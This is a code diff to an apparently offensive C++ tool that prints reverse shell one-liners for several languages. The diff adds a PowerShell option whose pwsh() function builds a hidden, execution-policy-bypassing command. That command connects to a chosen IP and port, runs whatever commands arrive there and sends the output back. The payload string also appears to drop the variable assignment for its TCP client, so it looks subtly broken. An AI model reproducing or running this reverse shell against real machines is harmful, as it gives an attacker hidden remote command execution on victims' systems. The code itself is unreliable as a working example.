@@ -23,7 +23,7 @@ using namespace std;
 
 bool isValidIP(const string& ip);
 int isValidPort(const int& portnum);
-
+string pwsh(string ip, string port);
 
 void printAsciiArt();
 string bash(string ip, string port);
@@ -32,6 +32,8 @@ string php(string ip, string port);
 string netcat(string ip, string port);
 string perl(string ip, string port);
 string ruby(string ip, string port);
+string powershell(string ip, string port);
+
 int main()
 {
 
@@ -41,13 +43,13 @@ int main()
   string n,t,res,listener;
   string ip,port;
   std::cout<< GREEN << "[+]Choose an option from the menu below"<< RESET <<endl;
-  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl"<< RESET <<endl<<endl;
+  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell"<< RESET <<endl<<endl;
   cout<<"Your Input(in words) : ";
   cin>>n;
 
   std::transform(n.begin(), n.end(), n.begin(), ::tolower);
 
-  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl"))
+  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&(n!="powershell"))
   {
     cout<< RED <<"Invalid Input!\nexiting!"<< RESET <<endl;
     exit(0);
@@ -101,6 +103,10 @@ int main()
   else if(n=="perl")
   {
     cout<<"Your perl reverse shell is : "<< RED << perl(ip,port)<< RESET <<endl<<endl;
+  }
+  else if(n=="powershell")
+  {
+    cout<<"Your powershell reverse shell is : "<< CYAN << pwsh(ip,port)<< RESET <<endl<<endl;
   }
 
 cout<< GREEN <<"[+]Do You want to start the listener ?[Y/N]"<< RESET <<endl;
@@ -195,6 +201,16 @@ string ruby(string ip, string port)
   s2=ip + "\"" + "," + port + "))'";
   shell=s1.append(s2);
   return shell;
+}
+
+string pwsh(string ip, string port)
+{
+  string s1,s2,s3,s4;
+  s1="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"";
+  s2=ip + "\"" + "," + port;
+  s3=");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+  s4=s1+s2+s3;
+  return s4;
 }
 
 
